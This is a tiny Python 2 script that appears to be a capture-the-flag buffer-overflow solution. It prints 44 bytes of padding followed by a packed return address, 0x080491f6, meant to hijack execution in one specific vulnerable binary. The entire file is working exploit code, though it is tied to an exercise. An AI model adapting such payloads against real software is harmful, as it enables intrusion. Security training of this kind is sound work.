#!/usr/bin/env python2
import struct

payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"
payload += struct.pack("I",0x080491f6)
print(payload)
